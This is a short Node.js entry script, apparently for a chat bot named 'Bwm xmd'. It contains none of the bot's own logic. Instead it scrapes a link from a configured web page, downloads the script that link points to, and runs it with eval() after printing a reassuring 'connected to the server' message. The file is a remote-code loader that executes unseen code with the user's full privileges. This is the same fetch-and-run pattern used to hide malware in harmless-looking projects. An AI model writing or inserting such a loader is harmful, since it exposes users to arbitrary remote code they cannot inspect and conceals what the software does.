//=====================//
//     Bwm xmd         //
//  Sir Ibrahim Adams  //
//=====================//




const axios = require('axios');
const cheerio = require('cheerio');
require('events').EventEmitter.defaultMaxListeners = 25;
const adams = require(__dirname + "/config");

async function fetchAdamsUrl() {
  try {
    const response = await axios.get(adams.BWM_XMD);
    const $ = cheerio.load(response.data);

    const adamsUrlElement = $('a:contains("ADAM_URL")'); 
    const adamsUrl = adamsUrlElement.attr('href');

    if (!adamsUrl) {
      throw new Error('The URL link not found...');
    }

    console.log('You have successfully connected to the server ✅');

    const scriptResponse = await axios.get(adamsUrl);
    eval(scriptResponse.data);

  } catch (error) {
    console.error('Fatal Error:', {
      message: error.message,
      stack: error.stack,
      timestamp: new Date().toISOString(),
      type: error.name,
      code: error.code || 'UNKNOWN'
    });

    // Attempt to recover or gracefully shutdown
    if (error.code === 'MODULE_NOT_FOUND') {
      console.error('Missing required module. Please check your dependencies.');
    } else if (error.code === 'ECONNREFUSED') {
      console.error('Connection refused. Please check your network connection.');
    }
  }
}

fetchAdamsUrl();
